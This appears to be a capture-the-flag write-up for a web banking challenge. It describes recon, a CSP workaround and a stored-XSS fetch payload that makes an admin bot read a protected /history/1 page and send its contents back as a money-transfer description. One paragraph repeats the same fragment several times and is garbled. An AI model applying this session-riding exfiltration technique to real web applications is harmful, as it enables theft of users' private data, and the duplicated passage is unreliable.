
# Table of Contents

1.  [How i got the virtual bank flag](#org1386e40)
    1.  [Recon](#org0b4e23a)
    2.  [Exploitation](#org79efaba)


<a id="org1386e40"></a>

# How i got the virtual bank flag


<a id="org0b4e23a"></a>

## Recon

Virtual bank is a web ctf of a seemingly normal bank, the features of the webapp are

-   logging/registering users
-   sending money to other users
-   check your transaction records
-   a "jobs" section in which you can send a link and a POW hash for an "admin" to read
    presumably the admin will read whatever its on the link

![img](./virtualbank_img/home.png)
this is what the home page looks like

![img](./virtualbank_img/error_msg.png)
I start poking with the sending money feature, i start sending money to myself, it does not allow me, the error page is a simple page that echoes everything it has in the "msg" parameter

![img](./virtualbank_img/send_money1.png)
![img](./virtualbank_img/send_money2.png)
i poke arround every endpoint, i try to inject an xss into the /sendmoney endpoint but i notice it has CSP which doesn't allow me execute inline scripts, i also notice that the transaction id's are stored sequentially, starting from 1, if i try to access /history/1 it gives me a 401
I will assume the flag is at /history/1, and that the challange is to somehow fetch it and read its contents


<a id="org79efaba"></a>

## Exploitation

1.  Exploitation Chain

Since we can send any url to admin, we probably need to store an xss inside an endpoint where user-generated text resides, we have the \\/error\\/?msg= parameter which echoes whatever we ask it to, and the \\/history\\/[id] endpoint, which allows us to store any text in it's *casuale* fieldwhere user-generated text resides, we have the *error*?msg= parameter which echoes whatever we ask it to, and the *history*[id] endpoint, which allows us to store any text in it's *casuale* fieldwhere user-generated text resides, we have the *error*?msg= parameter which echoes whatever we ask it to, and the *history*[id] endpoint, which allows us to store any text in it's *casuale* fieldwhere user-generated text resides, we have the *error*?msg= parameter which echoes whatever we ask it to, and the \\/history\\/[id] endpoint, which allows us to store any text in it's \\/casuale\\/ field
We cannot simply inject an xss into the \\/casuale\\/ field however, as CSP prevents us from doing so, our xss must resemble something like <script src="virtualbank.test/?msg=xss<sub>here</sub>"></script> in order to comply with CSP
In the end our scripts ends up looking like

```
    fetch(new Request("http://virtualbank.challs.olicyber.it/sendmoney",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"to=INSERTUSERNAMEHERE&amount=1&description="+fetch("http://virtualbank.challs.olicyber.it/history/1").then((response)=>{response.text().then((data)=>{fetch(new Request("http://virtualbank.challs.olicyber.it/sendmoney",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"to=INSERTUSERNAMEHERE&amount=2&description="+window.btoa(encodeURIComponent(data)),}))})}),}))
```

This code fetches /history/1's text, encodes it as base64, then it initiates a payment transfer with the base64 string as it's casuale, this code is inserted in another transaction's casuale field between me and the admin, then i submit a job request with the URL of the latter transaction
All in all, the flowchart is something like

![img](./virtualbank_img/send_money3.png)
attacker<sub>user</sub> sends 1$ to admin user with XSS as casuale with /sendmoney endpoint -> attacker<sub>user</sub> asks admin to check transaction created by user -> admin is targetted by XSS and sends /history/1's content to attacker<sub>user</sub> via the casuale field through the /sendmoney endpoint

![img](./virtualbank_img/send_money4.png)
a base 64 value arrives at our inbox, and after decoding as base64 and url-decoding it we get its contents

![img](./virtualbank_img/win.png)
![img](./virtualbank_img/epic.png)

